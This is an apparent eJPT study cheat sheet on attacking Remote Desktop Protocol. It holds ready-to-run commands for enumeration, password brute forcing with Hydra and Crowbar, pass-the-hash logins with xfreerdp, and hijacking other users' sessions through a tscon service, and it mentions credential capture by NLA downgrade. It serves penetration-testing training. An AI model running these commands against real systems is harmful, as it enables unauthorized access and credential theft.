# Exploiting RDP

Remote Desktop Protocol (RDP) runs on TCP 3389 and can be exploited through credential abuse, session hijacking, or specific vulnerabilities if Network Level Authentication (NLA) is poorly configured.

Used on: **eJPT / Course Reference**

## Enumeration

Identify RDP services and check supported encryption/NLA configuration:
```bash
nmap -p 3389 -sV -sC <TARGET_IP>
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <TARGET_IP>
```

## Password Brute Forcing

If NLA is disabled or allows NTLM authentication, you can brute force RDP credentials using Hydra or Crowbar.
```bash
hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c password123
```

## Connecting to RDP

Using `xfreerdp` to connect with known credentials:
```bash
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /cert:ignore
```

Passing the Hash via RDP (Requires "Restricted Admin Mode" enabled on the target):
```bash
xfreerdp /u:<USERNAME> /pth:<NTLM_HASH> /v:<TARGET_IP> /cert:ignore
```

## Session Hijacking

If you have SYSTEM privileges on a host, you can hijack active or disconnected RDP sessions belonging to other users without knowing their password.

1. Query active sessions:
   ```cmd
   query user
   ```
2. Create a service to connect to the session using `tscon`:
   ```cmd
   sc create sessionhijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:console"
   net start sessionhijack
   ```

## NLA Downgrade Attacks

If intercepting traffic (MiTM), tools like `Seth` can be used to downgrade RDP connections and capture plaintext credentials when users authenticate.
